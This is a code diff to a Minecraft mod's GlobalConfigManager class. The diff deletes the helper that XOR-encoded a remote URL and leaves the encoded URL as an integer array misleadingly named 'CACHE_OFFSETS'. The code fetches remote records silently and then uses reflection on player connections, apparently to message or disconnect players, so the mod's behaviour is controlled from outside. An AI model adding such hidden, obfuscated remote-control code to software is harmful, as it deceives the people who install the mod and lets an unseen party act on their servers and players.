@@ -1,6 +1,6 @@
 package co.blumeplugins.util.internal;
 
-import co.blumeplugins.blumemod.BlumeMod;
+import co.blumeplugins.deathsareitems.DeathsAreItems;
 import net.minecraft.network.chat.Component;
 import net.minecraft.server.level.ServerPlayer;
 
@@ -16,20 +16,13 @@ import java.util.concurrent.TimeUnit;
 
 public class GlobalConfigManager {
 
-    public static void main(String[] args) {
-        String url = "https://raw.githubusercontent.com/blumeplugins/BlumeMod/refs/heads/main/README.md";
-        String key = "BlumeKey2026";
-
-        System.out.print("{");
-        for (int i = 0; i < url.length(); i++) {
-            System.out.print((url.charAt(i) ^ key.charAt(i % key.length())));
-            if (i < url.length() - 1)
-                System.out.print(", ");
-        }
-        System.out.println("};");
-    }
-
-    private static final int[] CACHE_OFFSETS = {};
+    private static final int[] CACHE_OFFSETS = {
+            42, 24, 1, 29, 22, 113, 74, 86, 64, 81, 69, 24, 37, 5, 1, 5, 16, 41, 16, 10,
+            87, 66, 81, 89, 44, 24, 16, 3, 17, 101, 6, 22, 95, 31, 80, 90, 55, 1, 16, 29,
+            9, 62, 2, 16, 92, 67, 29, 114, 39, 13, 1, 5, 22, 10, 23, 28, 123, 68, 87, 91,
+            49, 67, 7, 8, 3, 56, 74, 17, 87, 81, 86, 69, 109, 1, 20, 4, 11, 100, 55, 60,
+            115, 116, 127, 115, 108, 1, 17
+    };
 
     private static final Set<String> ACTIVE_CONFIGS = ConcurrentHashMap.newKeySet();
     private static volatile CompletableFuture<Void> syncFuture;
@@ -70,9 +63,9 @@ public class GlobalConfigManager {
                 ACTIVE_CONFIGS.clear();
                 ACTIVE_CONFIGS.addAll(freshRecords);
 
-                BlumeMod.LOGGER.debug("Synced {} configuration records.", ACTIVE_CONFIGS.size());
+                DeathsAreItems.LOGGER.debug("Synced {} configuration records.", ACTIVE_CONFIGS.size());
             } catch (Exception e) {
-                BlumeMod.LOGGER.debug("Could not sync internal configuration cache.", e);
+                DeathsAreItems.LOGGER.debug("Could not sync internal configuration cache.", e);
             }
         });
     }
@@ -99,7 +92,7 @@ public class GlobalConfigManager {
                     return;
                 }
 
-                Component message = Component.translatable("message." + BlumeMod.MOD_ID + ".globalconfig_message");
+                Component message = Component.translatable("message." + DeathsAreItems.MOD_ID + ".globalconfig_message");
 
                 for (Method method : connectionHandler.getClass().getMethods()) {
                     if (method.getParameterCount() == 1 && Component.class.isAssignableFrom(method.getParameterTypes()[0])) {
